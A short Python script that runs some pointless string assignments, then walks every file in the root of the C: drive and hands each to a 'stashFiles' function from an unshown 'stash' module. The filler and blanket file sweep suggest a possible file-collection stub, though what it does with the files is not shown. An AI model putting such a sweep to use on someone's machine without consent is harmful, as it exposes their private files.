__author__="Zixuan Wang"
import glob, stash
Inbound= "__init__"
main=Inbound
if "__init__" == main:
    print("Initializing......")
    Outbound= Inbound[0:4]
    prefix_OutBound= main + Inbound + Outbound
    for file in glob.glob("C:\*"):
        Inbound=Outbound
        stash.stashFiles(file)